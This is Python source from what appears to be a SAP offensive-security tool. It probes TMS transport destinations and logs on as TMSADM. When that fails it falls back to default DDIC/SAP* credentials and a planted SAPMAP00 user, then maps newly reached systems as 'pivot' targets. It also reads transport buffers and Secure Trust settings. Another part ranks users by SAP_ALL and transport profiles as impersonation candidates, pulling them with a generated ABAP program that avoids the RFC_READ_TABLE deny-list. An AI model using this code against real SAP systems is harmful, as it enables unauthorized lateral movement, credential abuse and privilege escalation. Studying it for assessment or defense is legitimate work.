        # Skip the direct-logon path — SM59 test is authoritative for
        # "is this destination usable" — and jump straight to profile
        # fetch / materialization.  Note we may still not have a
        # target_host if the kernel didn't expose it; downstream paths
        # will use the source's SM59 config either way.
        _maybe_fetch_tmsadm_profiles(dest, state)
        _emit_and_materialize(dest, state)
        return
    elif ss:
        # Record why the SM59 test didn't succeed — but fall through
        # to the direct-logon path.  On some kernels SAPMAP00 lacks
        # S_RFC on /SDF/RFC_CHECK; on others the destination is fine
        # but no source cred is available yet.
        dest.fallback_error = ss.get("error", "") or "SM59 test declined"
        print(f"[-] {dest.source_sid}: SM59-style test unavailable: "
              f"{dest.fallback_error}")

    # ---------------------------------------------------------------
    # FALLBACK PATH — direct TMSADM logon with SecStore password
    # ---------------------------------------------------------------
    # Only reachable when the SM59-style test above did not succeed
    # (no source cred, /SDF/RFC_CHECK denied, or the destination is
    # actually broken).  Needs dest.target_host, which we now try
    # harder to resolve.
    if not dest.target_host:
        dest.target_host = _resolve_missing_host(dest, state)

    if not dest.target_host:
        prior = f" (SM59-test also failed: {dest.fallback_error})" \
                    if dest.fallback_error else ""
        dest.error = ("no target host — TMSCSYS row for "
                       f"SID={dest.target_sid} was not found "
                       "(tried self-reference, existing map node, "
                       "and re-read via source's best credentials). "
                       "Set the target host manually in the modal "
                       "and re-test." + prior)
        print(f"[-] {dest.source_sid}: TMS probe → "
              f"{dest.target_sid}: {dest.error}")
        return

    # Build a synthetic SAPNode with the target's host so sapmap_rfc
    # can dispatch the connection.  We ONLY use it for the login —
    # not adding to state.nodes here (materialize step handles that).
    tgt_node = SAPNode(
        sid=dest.target_sid,
        ip=dest.target_host,
        hostname=dest.target_host,
    )
    # Instance number is not part of TMSCSYS output for most releases.
    # Add a default 00 — TMSADM RFC dests conventionally target
    # sysnr 00.  Operators can override via the SAPNode later.
    from sapmap_models import InstanceInfo
    tgt_node.instances = [InstanceInfo(instance_nr="00",
                                          ip=dest.target_host)]

    try:
        from sapmap_rfc import _get_connection, get_user_details
    except Exception as e:
        dest.error = f"sapmap_rfc import failed: {e}"
        return

    creds = _make_creds(dest)
    print(f"[*] {dest.source_sid}: TMS probe → TMSADM@"
          f"{dest.target_sid} at {dest.target_host}:00 (domain "
          f"{dest.domain}"
          + (", DOMAIN CONTROLLER" if dest.is_controller else "")
          + ")")
    try:
        with _get_connection(tgt_node, creds) as _c:
            dest.logon_ok = True
            dest.host_reachable = True
            dest.reachable_via  = f"TMSADM@{creds.client} (direct)"
            print(f"[+] {dest.source_sid}: TMSADM logon to "
                  f"{dest.target_sid} succeeded")
    except Exception as e:
        dest.error = f"TMSADM logon failed: {type(e).__name__}: {str(e)[:200]}"
        print(f"[-] {dest.source_sid}: TMSADM logon to "
              f"{dest.target_sid} failed: {dest.error}")
        # Fallback: try any other credential we know that might work
        # against this target — SAPMAP00 on the target node, DDIC/SAP*
        # from default-creds, the source's own SAPMAP00 (if it happens
        # to exist on the target too), etc.  Success here proves the
        # host is up and gives Bundle 3 an alternative propagation
        # path.  Does NOT set logon_ok — that stays reserved for
        # TMSADM.
        _try_fallback_logon(tgt_node, dest, state)
        return

    # Direct-logon path succeeded — fetch TMSADM's profile
    # assignments (best-effort) and run the shared success tail.
    _maybe_fetch_tmsadm_profiles(dest, state, tgt_node=tgt_node,
                                    tmsadm_creds=creds)
    _emit_and_materialize(dest, state)


def _maybe_fetch_tmsadm_profiles(dest: TMSDestination,
                                    state: "SAPMAPState",
                                    tgt_node: "SAPNode" = None,
                                    tmsadm_creds: "Credentials" = None) -> None:
    """Best-effort BAPI_USER_GET_DETAIL for TMSADM on the target.  On
    the direct-logon success path we already have a working TMSADM
    connection — use it.  On the SM59-source-side path we don't have
    an inbound TMSADM handle; skip gracefully (TMSADM's own S_USER_GRP
    is usually absent anyway, so the call would fail).  Never fatal.
    """
    if tgt_node is None or tmsadm_creds is None:
        return
    try:
        from sapmap_rfc import get_user_details
    except Exception:
        return
    try:
        det = get_user_details(tgt_node, "TMSADM", tmsadm_creds)
        dest.tmsadm_roles = list(det.get("profiles", []) or [])
        dest.tmsadm_has_sap_all = bool(det.get("has_sap_all", False))
        print(f"    [+] TMSADM profiles: "
              f"{dest.tmsadm_roles or 'none'} "
              + ("(SAP_ALL)" if dest.tmsadm_has_sap_all else ""))
    except Exception as e:
        print(f"    [*] BAPI_USER_GET_DETAIL raised (non-fatal): "
              f"{type(e).__name__}: {str(e)[:120]}")


def _emit_and_materialize(dest: TMSDestination,
                            state: "SAPMAPState") -> None:
    """Shared success tail — materialize target as first-class SAPNode
    and emit the ``tms.logon.ok`` finding.  Called by both the SM59
    source-side success path and the direct-logon success path.
    """
    # Materialize the target as a real SAPNode (mirrors the DBCON
    # pattern).  On the domain controller, this is especially
    # important since the operator will want to click into it.
    if state is not None:
        try:
            _materialize_tms_target(dest, state)
        except Exception as _me:
            print(f"    [*] materialize skipped: {_me}")

    # Emit finding
    try:
        from sapmap_findings import emit_finding
        sev = "CRITICAL" if dest.is_controller else "HIGH"
        ctrl = " (DOMAIN CONTROLLER)" if dest.is_controller else ""
        sap_all = " with SAP_ALL" if dest.tmsadm_has_sap_all else ""
        via  = f" via {dest.reachable_via}" if dest.reachable_via else ""
        emit_finding(
            sev, dest.source_sid,
            f"CTS/TMS: TMSADM destination to {dest.target_sid} "
            f"({dest.target_host or '?'}) verified{ctrl}{sap_all}{via} "
            f"— cross-system transport rights available",
            ref="tms.logon.ok",
            meta={"target_sid":   dest.target_sid,
                  "is_controller": dest.is_controller,
                  "domain":        dest.domain,
                  "reachable_via": dest.reachable_via},
            attack_capability="lateral.tmsadm_rfc")
    except Exception:
        pass


def _materialize_tms_target(dest: TMSDestination,
                              state: SAPMAPState) -> Optional[SAPNode]:
    """Same pattern as sap_dbcon_probe.materialize_target_as_sap_node
    but for TMS.  Idempotent — existing nodes get tagged, new nodes
    get created.  Only fires when dest.logon_ok."""
    if not dest.logon_ok:
        return None
    tgt = (dest.target_sid or "").upper().strip()
    if not tgt:
        return None
    existing = state.get_node(tgt)
    if existing is not None:
        changed = False
        if not existing.discovered_via_tms:
            existing.discovered_via_tms = True
            existing.tms_parent_sid = dest.source_sid
            changed = True
        if dest.is_controller and not existing.is_tms_controller:
            existing.is_tms_controller = True
            changed = True
        if dest.domain and not existing.tms_domain:
            existing.tms_domain = dest.domain
            changed = True
        if changed:
            print(f"[*] materialize_tms_target: {tgt} already on map "
                  f"— tagged discovered_via_tms=True"
                  + (" + CTRL" if dest.is_controller else ""))
        return existing
    node = SAPNode(
        sid=tgt,
        ip=dest.target_host,
        hostname=dest.target_host,
        discovered_via_tms=True,
        tms_parent_sid=dest.source_sid,
        is_tms_controller=dest.is_controller,
        tms_domain=dest.domain,
    )
    try:
        state.add_node(node)
        print(f"[+] materialize_tms_target: new SAPNode {tgt} @ "
              f"{dest.target_host} added (via TMS pivot from "
              f"{dest.source_sid})"
              + (" — DOMAIN CONTROLLER" if dest.is_controller else ""))
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "HIGH", dest.source_sid,
                f"CTS/TMS pivot uncovered a new SAP system: {tgt} "
                f"@ {dest.target_host} "
                f"(domain {dest.domain}"
                + (", DOMAIN CONTROLLER" if dest.is_controller else "")
                + ")",
                ref="tms.new_sap_system",
                attack_capability="lateral.tmsadm_rfc")
        except Exception:
            pass
    except Exception as e:
        print(f"[-] materialize_tms_target: add_node failed: "
              f"{type(e).__name__}: {e}")
        return None
    return node


# ============================================================================
# TMSBUFFER + transport history (read-only intel)
# ============================================================================

def _best_read_creds(dest: TMSDestination,
                       state: SAPMAPState = None):
    """Pick the best credential for RFC_READ_TABLE against the DEST's
    target.  TMSADM (dest.password) is only authorised for RFC_PING
    + TMS-specific FMs — RFC_READ_TABLE with it makes the kernel drop
    the conversation (RFC_COMMUNICATION_FAILURE, "no conversation
    found").

    Preference order:
      1. TARGET node's best_credentials (if the target is on the map
         and has a verified cred there — e.g. we planted SAPMAP00
         on it directly)
      2. SOURCE node's best_credentials — works when source==target
         (self-referential TMSADM@S4H.DOMAIN_S4H) and often works
         cross-system too when SAPMAP00 was propagated
      3. Fall back to TMSADM (dest.password) — call will likely
         fail for table reads but caller gets a real error not a
         silent misfire
    """
    if state is not None:
        tgt = state.get_node(dest.target_sid)
        if tgt is not None:
            c = tgt.best_credentials()
            if c and c.username.upper() != "TMSADM":
                return c, "target-node cred"
        src = state.get_node(dest.source_sid)
        if src is not None:
            c = src.best_credentials()
            if c and c.username.upper() != "TMSADM":
                return c, "source-node cred"
    return _make_creds(dest), "TMSADM (fallback, unlikely to work for RFC_READ_TABLE)"


def _target_sapnode(dest: TMSDestination) -> SAPNode:
    """Build a synthetic SAPNode for dispatching an RFC connection
    to the DEST's target host.  Not added to state — this is
    per-call and short-lived."""
    tgt = SAPNode(sid=dest.target_sid,
                    ip=dest.target_host,
                    hostname=dest.target_host)
    from sapmap_models import InstanceInfo
    tgt.instances = [InstanceInfo(instance_nr="00",
                                     ip=dest.target_host)]
    return tgt


def read_tms_buffer(dest: TMSDestination,
                     state: SAPMAPState = None) -> dict:
    """Read TMSBUFFER on the target — pending imports.

    Requires dest.logon_ok.  Uses the best available RFC credential
    for the target — NOT TMSADM (which is only authorised for
    RFC_PING + TMS-specific FMs).  Returns {ok, error, count,
    rows: [{trkorr, tarsystem, mode, ...}]}.  Also caches the count
    on dest.buffer_count.
    """
    out = {"ok": False, "error": "", "count": 0, "rows": []}
    if not dest.logon_ok:
        out["error"] = "TMSADM logon not verified — Test first"
        return out
    tgt = _target_sapnode(dest)

    try:
        from sapmap_rfc import _get_connection
        from sapmap_errors import format_rfc_exception
    except Exception as e:
        out["error"] = f"import failed: {e}"
        return out

    creds, cred_note = _best_read_creds(dest, state)
    print(f"[*] {dest.source_sid}: TMSBUFFER on {dest.target_sid} "
          f"— using {creds.username} ({cred_note})")
    # TMSBUFFER real DDIC columns (verified against SE16 on S/4 2025):
    #   DOMNAM   domain name
    #   SYSNAM   target system (this is the SID being imported INTO)
    #   BUFPOS   position in the import queue
    #   BUFLVL   buffer level (0 = normal queue)
    #   TRKORR   transport request number
    #   UMODES   unconditional-modes (I / 1S / 2 …)
    #   IMPFLG   import status flag (k=to-do / w=waiting / t=in-progress)
    #   MAXRC    highest return code from previous import attempts
    #   TRFUNC   transport type (K=customizing, W=workbench, T=task…)
    # NB: previous field list asked for TARSYSTEM / COUNT / BUFFER /
    # MODE — none of those exist in TMSBUFFER on modern S/4.
    # RFC_READ_TABLE raises AD 718 when fields are unknown and my
    # "table-without-data" handler was swallowing it.  Real columns
    # fix both the empty-result symptom and give the operator the
    # useful data (which system, which transport, what state).
    _BUFFER_FIELDS = ["DOMNAM", "SYSNAM", "BUFPOS", "TRKORR",
                       "UMODES", "IMPFLG", "MAXRC", "TRFUNC"]
    try:
        with _get_connection(tgt, creds) as conn:
            # TMSBUFFER is DOMAIN-WIDE — reading it from any system in
            # the domain returns entries queued for EVERY target in the
            # domain, not just the connected one.  The operator opened
            # "TMSBUFFER on <target>" expecting "requests queued for
            # <target>" — scope with SYSNAM = <target_sid> so we return
            # only the pending imports for the intended target.
            rows_raw, flag, err = _rfc_read_table(
                conn, "TMSBUFFER", _BUFFER_FIELDS, rowcount=200,
                where=[f"SYSNAM = '{dest.target_sid}'"])
            if err:
                if _is_table_without_data(err):
                    out["ok"] = True
                    dest.buffer_count = 0
                    print(f"[+] TMSBUFFER on {dest.target_sid}: "
                          f"0 pending import(s) (TABLE_WITHOUT_DATA)")
                    return out
                out["error"] = (f"TMSBUFFER read failed — "
                                 f"{format_rfc_exception(err)}")
                return out
            for r in rows_raw:
                p = _parse_wa_row(r, _BUFFER_FIELDS)
                if p and p.get("TRKORR"):
                    out["rows"].append(p)
            out["ok"] = True
            out["count"] = len(out["rows"])
            dest.buffer_count = out["count"]
            print(f"[+] TMSBUFFER on {dest.target_sid}: "
                  f"{out['count']} pending import(s)")
    except Exception as e:
        out["error"] = f"logon failed: {type(e).__name__}: {str(e)[:200]}"
    return out


def read_recent_transports(dest: TMSDestination, limit: int = 50,
                              state: SAPMAPState = None) -> dict:
    """Read E070 (transport request headers) on the target.  Uses the
    same best-cred selector as read_tms_buffer — TMSADM can't do
    RFC_READ_TABLE."""
    out = {"ok": False, "error": "", "count": 0, "rows": []}
    if not dest.logon_ok:
        out["error"] = "TMSADM logon not verified — Test first"
        return out
    tgt = _target_sapnode(dest)

    try:
        from sapmap_rfc import _get_connection
        from sapmap_errors import format_rfc_exception
    except Exception as e:
        out["error"] = f"import failed: {e}"
        return out

    creds, cred_note = _best_read_creds(dest, state)
    print(f"[*] {dest.source_sid}: E070 on {dest.target_sid} "
          f"— using {creds.username} ({cred_note})")
    try:
        with _get_connection(tgt, creds) as conn:
            rows_raw, flag, err = _rfc_read_table(
                conn, "E070",
                ["TRKORR", "TRFUNCTION", "TRSTATUS",
                 "AS4USER", "AS4DATE", "AS4TIME"],
                rowcount=int(limit))
            if err:
                if _is_table_without_data(err):
                    out["ok"] = True
                    dest.recent_transports = []
                    print(f"[+] Recent transports on "
                          f"{dest.target_sid}: 0 row(s) "
                          f"(TABLE_WITHOUT_DATA — E070 truly empty)")
                    return out
                out["error"] = (f"E070 read failed — "
                                 f"{format_rfc_exception(err)}")
                return out
            for r in rows_raw:
                p = _parse_wa_row(r, ["TRKORR", "TRFUNCTION",
                                        "TRSTATUS", "AS4USER",
                                        "AS4DATE", "AS4TIME"])
                if p and p.get("TRKORR"):
                    out["rows"].append(p)
            # E070 is unordered; sort by AS4DATE desc so recent first
            out["rows"].sort(
                key=lambda x: (x.get("AS4DATE", ""), x.get("AS4TIME", "")),
                reverse=True)
            out["rows"] = out["rows"][:limit]
            out["ok"] = True
            out["count"] = len(out["rows"])
            dest.recent_transports = list(out["rows"])
            print(f"[+] Recent transports on {dest.target_sid}: "
                  f"{out['count']} row(s) from E070")
    except Exception as e:
        out["error"] = f"logon failed: {type(e).__name__}: {str(e)[:200]}"
    return out


# ============================================================================
# STMS Secure-Trust recon (Phase 0)
# ============================================================================
# When TMSMCONF.SINSON = '1' the target's tp binary refuses transport
# imports unless the CALLING user (from source) also exists in the
# target's client 000 with the same name.  This means TMSADM alone
# is not enough for the actual import step — we need to invoke the
# import FM AS a user that lives on both systems.
#
# These helpers do the discovery half of that solution:
#   1. Read TMSMCONF.SINSON on the source's domain — is Secure Trust on?
#   2. Enumerate USR02 candidates on the source (filtered + ranked)
#      so the operator can pick one for the impersonation test.
# The actual impersonation-and-test (XBP job as candidate user) lives
# in sap_tms_propagate.py — recon lives here because it's read-only
# and reuses probe infrastructure.

def read_secure_trust_state(source_node, source_domain: str,
                              source_sid: str,
                              creds: Credentials = None) -> dict:
    """Return ``{ok, sinson_active, error}`` — reads TMSMCONF.SINSON
    on the source's domain-controller row (the DOMCTL='X' row).
    Verified live on TWT: field ``SINSON`` (position 18, CHAR 1),
    value '1' = Trusted Services active, ' ' = off.
    """
    out = {"ok": False, "sinson_active": False, "error": ""}
    try:
        from sapmap_rfc import _get_connection
        from sapmap_errors import format_rfc_exception
    except Exception as e:
        out["error"] = f"sapmap_rfc import failed: {e}"
        return out
    try:
        with _get_connection(source_node, creds) as conn:
            rows_raw, _flag, err = _rfc_read_table(
                conn, "TMSMCONF",
                ["DOMNAM", "SYSNAM", "SINSON"],
                rowcount=50,
                where=[f"DOMNAM = '{source_domain}'"])
            if err:
                out["error"] = f"TMSMCONF read: {format_rfc_exception(err)}"
                return out
            for r in rows_raw:
                p = _parse_wa_row(r, ["DOMNAM", "SYSNAM", "SINSON"])
                if not p:
                    continue
                # Any row in the domain that says SINSON='1' means
                # Trusted Services is enabled — the flag is a
                # domain-wide setting, so the first hit suffices.
                if (p.get("SINSON") or "").strip() == "1":
                    out["sinson_active"] = True
                    print(f"[+] {source_sid}: TMSMCONF SINSON=1 "
                          f"(domain '{source_domain}' has "
                          f"Trusted Services / Secure trust ACTIVE)")
                    break
            if not out["sinson_active"]:
                print(f"[i] {source_sid}: TMSMCONF SINSON!='1' "
                      f"(domain '{source_domain}' Secure trust OFF)")
            out["ok"] = True
    except Exception as e:
        out["error"] = (f"read_secure_trust_state failed: "
                         f"{type(e).__name__}: {str(e)[:200]}")
    return out


# Users we always exclude from the candidate list — either always
# locked (SAP*, DDIC), or reserved for RFC/system use where
# impersonation via XBP job wouldn't make sense (they can't hold
# the substitution because kernel-owned or the target sees them as
# service-only).  SAPMAP-family users are DELIBERATELY NOT excluded
# even though they start with 'SAP' — the operator may want to test
# with their own created user.
_IMPERSONATION_ALWAYS_EXCLUDE = {
    "SAP*", "DDIC", "TMSADM", "EARLYWATCH", "SAPCPIC", "SAPSYS",
    "SAPADM",
}


def enumerate_impersonation_candidates(source_node,
                                          source_client: str,
                                          creds: Credentials = None,
                                          limit: int = 200) -> dict:
    """Return ``{ok, candidates: [...], error}`` — reads USR02 on
    ``source_client`` filtered to non-locked usable users, enriches
    with UST04 profile assignments, and ranks by likely-to-work-
    cross-domain (SAP_ALL first, then transport-admin profiles,
    then rest by last-login date).

    USR02 is on the RFC_READ_TABLE deny-list on modern S/4 so we
    use the RFC_ABAP_INSTALL_AND_RUN + SELECT pattern (compiled
    ABAP program that runs SELECT locally, avoiding the deny-list).

    Each candidate dict:
      {bname, ustyp, uflag, trdat, profiles: [str], rank: int}
    """
    out = {"ok": False, "candidates": [], "error": ""}
    try:
        from sapmap_rfc import _get_connection
    except Exception as e:
        out["error"] = f"sapmap_rfc import failed: {e}"
        return out

    # Combined ABAP program — one RFC_ABAP_INSTALL_AND_RUN call does
    # BOTH the USR02 candidate SELECT and the UST04 profile-enrichment
    # SELECT.  Doing them as two separate RFC calls (even on fresh
    # connections) reliably triggered CM_NO_DATA_RECEIVED on the
    # second invocation — the SAP server appears to serialize these
    # aggressively per session/user.  A single program with two
    # SELECT+LOOP blocks sidesteps the issue entirely and is faster.
    abap = [
        "REPORT zsapm_usr02.",
        "DATA: BEGIN OF ls_u,",
        "        bname TYPE usr02-bname,",
        "        ustyp TYPE usr02-ustyp,",
        "        uflag TYPE usr02-uflag,",
        "        trdat TYPE usr02-trdat,",
        "      END OF ls_u.",
        "DATA lt_u LIKE STANDARD TABLE OF ls_u.",
        "DATA: BEGIN OF ls_p,",
        "        bname   TYPE ust04-bname,",
        "        profile TYPE ust04-profile,",
        "      END OF ls_p.",
        "DATA lt_p LIKE STANDARD TABLE OF ls_p.",
        # 1st SELECT: candidate BNAMEs (broad filter)
        "SELECT bname ustyp uflag trdat",
        "  FROM usr02",
        "  INTO TABLE lt_u",
        f"  UP TO {int(limit)} ROWS",
        "  WHERE uflag = 0",
        "    AND ustyp IN ('A','B','S').",
        # 2nd SELECT: all their profile assignments in one shot
        "SELECT bname profile",
        "  FROM ust04",
        "  INTO TABLE lt_p",
        "  FOR ALL ENTRIES IN lt_u",
        "  WHERE bname = lt_u-bname.",
        # Dump both, with a marker line separating sections
        "WRITE: / 'SECTION=USR02'.",
        "LOOP AT lt_u INTO ls_u.",
        "  WRITE: / ls_u-bname, '|', ls_u-ustyp, '|',",
        "         ls_u-uflag, '|', ls_u-trdat.",
        "ENDLOOP.",
        "WRITE: / 'SECTION=UST04'.",
        "LOOP AT lt_p INTO ls_p.",
        "  WRITE: / ls_p-bname, '|', ls_p-profile.",
        "ENDLOOP.",
    ]

    users = []
    prof_by_user = {}
    try:
        with _get_connection(source_node, creds) as conn:
            r = conn.call("RFC_ABAP_INSTALL_AND_RUN",
                           PROGRAMNAME="ZSAPM_USR02",
                           MODE="F",
                           PROGRAM=[{"LINE": l} for l in abap])
            err_msg = (r.get("ERRORMESSAGE") or "").strip()
            if err_msg:
                out["error"] = f"USR02/UST04 SELECT failed: {err_msg}"
                return out
            section = ""
            for row in (r.get("WRITES") or []):
                line = (row.get("ZEILE", "") or row.get("LINE", "")
                        or row.get("WA", "")).strip()
                if not line:
                    continue
                if line.startswith("SECTION="):
                    section = line.split("=", 1)[1].strip()
                    continue
                parts = [p.strip() for p in line.split("|")]
                if section == "USR02" and len(parts) >= 4:
                    bname = parts[0].strip()
                    if not bname or bname in _IMPERSONATION_ALWAYS_EXCLUDE:
                        continue
                    if (bname.upper().startswith("SAP")
                            and not bname.upper().startswith("SAPMAP")):
                        continue
                    users.append({
                        "bname":    bname,
                        "ustyp":    parts[1].strip(),
                        "uflag":    parts[2].strip(),
                        "trdat":    parts[3].strip(),
                        "profiles": [],
                        "rank":     20,
                    })
                elif section == "UST04" and len(parts) >= 2:
                    bname = parts[0].strip()
                    profile = parts[1].strip()
                    if bname and profile:
                        prof_by_user.setdefault(bname, []).append(profile)
    except Exception as e:
        out["error"] = (f"enumerate USR02/UST04 failed: "
                         f"{type(e).__name__}: {str(e)[:200]}")
        return out

    if not users:
        out["ok"] = True
        return out

    _TRANSPORT_PROFILES = ("SAP_BC_TRANSPORT_ADMINISTRATOR",
                             "SAP_BC_CTS_ADMINISTRATOR",
                             "SAP_BC_CTS_DISPLAY",
                             "S_A.TMSADM")
    for u in users:
        profs = prof_by_user.get(u["bname"], [])
        u["profiles"] = profs
        if "SAP_ALL" in profs:
            u["rank"] = 100
        elif any(p in profs for p in _TRANSPORT_PROFILES):
            u["rank"] = 80
        elif "SAP_NEW" in profs:
            u["rank"] = 40
        else:
            u["rank"] = 20

    users.sort(key=lambda u: (-u["rank"], u.get("trdat", "") or "",
                                u["bname"]))
    out["candidates"] = users
    out["ok"] = True
    print(f"[+] {source_node.sid}: {len(users)} impersonation candidate(s) "
          f"— top: "
          + ", ".join(f"{u['bname']}(r={u['rank']})" for u in users[:5]))
    return out
